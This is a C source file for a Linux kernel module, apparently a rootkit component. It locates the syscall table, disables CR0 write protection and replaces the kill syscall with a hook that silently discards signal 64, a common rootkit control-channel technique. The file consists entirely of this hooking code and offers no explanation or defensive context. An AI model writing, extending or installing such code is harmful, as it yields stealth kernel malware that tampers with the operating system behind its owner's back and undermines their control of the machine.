#include "memory_utils.h"
#include "syscall_hook.h"
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>

typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);

static unsigned long **syscall_table;
static orig_kill_t real_kill;

static unsigned long **find_syscall_table(void) {
    return (unsigned long **)rk_resolve_symbol("sys_call_table");
}

static void disable_wp(void) {
    write_cr0(read_cr0() & (~0x10000));
}

static void enable_wp(void) {
    write_cr0(read_cr0() | 0x10000);
}

static asmlinkage long hooked_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == 64)
        return 0;

    return real_kill(regs);
}

void setup_syscall_hook(void) {
    syscall_table = find_syscall_table();
    if (!syscall_table)
        return;

    real_kill = (orig_kill_t)syscall_table[__NR_kill];

    disable_wp();
    syscall_table[__NR_kill] = (unsigned long *)hooked_kill;
    enable_wp();
}

void remove_syscall_hook(void) {
    if (!syscall_table)
        return;

    disable_wp();
    syscall_table[__NR_kill] = (unsigned long *)real_kill;
    enable_wp();
}
